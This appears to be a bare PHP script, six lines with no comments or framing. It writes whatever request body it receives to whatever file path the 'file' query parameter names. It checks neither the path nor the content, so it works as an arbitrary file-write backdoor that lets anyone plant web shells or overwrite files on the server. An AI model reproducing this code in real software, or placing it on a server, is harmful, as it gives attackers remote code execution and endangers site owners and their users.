<?php
    $file = $_GET['file'];
    $content = file_get_contents('php://input');
    $fh = fopen($file, 'w');
    fwrite($fh, $content);
    fclose($fh);